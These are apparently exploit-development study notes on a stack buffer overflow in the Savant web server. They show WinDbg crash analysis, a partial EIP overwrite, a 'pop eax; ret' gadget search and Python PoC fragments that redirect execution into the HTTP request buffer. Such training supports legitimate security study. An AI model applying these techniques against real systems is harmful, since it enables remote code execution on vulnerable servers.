# Procedure



{% code overflow="wrap" %}
```bash
# 1. Run PoC to crash the application
# 2. Analyze the crash
## 1. Only 3 bytes available for shellcode 
dds @esp L5
0472ea2c  00414141 Savant+0x14141
0472ea30  0472ea84
0472ea34  0041703c Savant+0x1703c
0472ea38  01725720
0472ea3c  01725720
## 2. Attempt to increase size of the buffer
## 3. Check if registers point to buffer at time of overflow
## 4. Second byte above points to a memory location very close to the current stack. Viewing this location shows. The initial GET request that is part of the payload. 
0:003> dc poi(esp+4)
0472ea84  00544547 00000000 00000000 00000000  GET.............
0472ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0472eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
# 3. Check for bad characters. Because space is limited may have to comment out some of the bad characters to reduce the size of the payload sometimes it won't crash. Othertimes you won't see all of the bad chars in WinDbg. 
# 4. Gain control of the execution flow. Use a pattern to find the exact offset. If pattern fails to work. If this occurs split buffer into A's & B's to locate it manually. 
# 5. Find an instruction to overwrite the EIP with.
## 1. Load narly and list protections of all loaded modules
.load narly
!nmod
## 2. Savant webserver doesn't have any loaded modules and the address starts with a NULL bytes which could be a problem. 
## 3. Partial EIP overwrite means that we can leverage this to address the NULL byte in the address. 
0:004> dds @esp L4
03f9ea2c  00434343 Savant+0x34343
03f9ea30  03f9ea84
03f9ea34  0041703c Savant+0x1703c
03f9ea38  01855758
## 4. Update PoC to only overwrite the lower 3 bytes of the EIP register. Run to confirm partial EIP overwrite is possible. 
  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= b"\x42\x42\x42" 
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
## 5. At time of crash the second DWord on the stack points very close to the stack pointer. 
0:004> dds @esp L5
03feea2c  03fefe70
03feea30  03feea84
03feea34  0041703c Savant+0x1703c
03feea38  01965758
03feea3c  01965758
0:004> dc poi(@esp+0x04)
03feea84  00544547 00000000 00000000 00000000  GET.............
03feea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
03feeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
03feeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 6. Find a way to redirect to this data. An instruction sequence like pop eax, ret. Should remove the first value from the stack then return us to the value that points to the GET request. Run msf-nasm_shell to get the op codes for the pop eax, ret sequence. 
â¯ msf-nasm_shell
nasm > pop eax
00000000  58                pop eax
nasm > ret
00000000  C3                ret
nasm >
## 7. Search for the sequence in WinDbg. 
0:004> lm m Savant
Browse full module list
start    end        module name
00400000 00452000   Savant   C (no symbols)           
0:004> s -[1]b 00400000 00452000 58 c3
0x00418674
0x0041924f
## 8. Update the PoC to point overwrite the EIP to jump to this newly found address. Before running it however set a breakpoint to the address listed below. 
  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
## 9. After single stepping through after the return. We can see we landed at the correct place. While the first few instructions generated by the GET portion of the payload may not cause any issue it is not very clean. 
Breakpoint 0 hit
eax=00000000 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=00418674 esp=0402ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax
0:004> t
eax=0402fe70 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=00418675 esp=0402ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret
0:004> t
eax=0402fe70 ebx=016b5758 ecx=0000000e edx=77841670 esi=016b5758 edi=0041703c
eip=0402ea84 esp=0402ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0402ea84 47              inc     edi
0:004> u @eip
0402ea84 47              inc     edi
0402ea85 45              inc     ebp
0402ea86 54              push    esp
0402ea87 0000            add     byte ptr [eax],al
0402ea89 0000            add     byte ptr [eax],al
0402ea8b 0000            add     byte ptr [eax],al
0402ea8d 0000            add     byte ptr [eax],al
0402ea8f 0000            add     byte ptr [eax],al
0:004> dc @eip
0402ea84  00544547 00000000 00000000 00000000  GET.............
0402ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0402eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0402eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 10. Rerun the PoC again, setting the same breakpoint as before and stop right before the return instruction. 
bp 0x00418674
g
<Send Payload> 
0:004> t
eax=0417fe70 ebx=019c5758 ecx=0000000e edx=77841670 esi=019c5758 edi=0041703c
eip=00418675 esp=0417ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret
0:004> dc poi(@esp)
0417ea84  00544547 00000000 00000000 00000000  GET.............
0417ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0417eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0417eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
## 11. The size of the HTTP Method field seems very large and may not have accurate checks. This will be verified. 

```
{% endcode %}
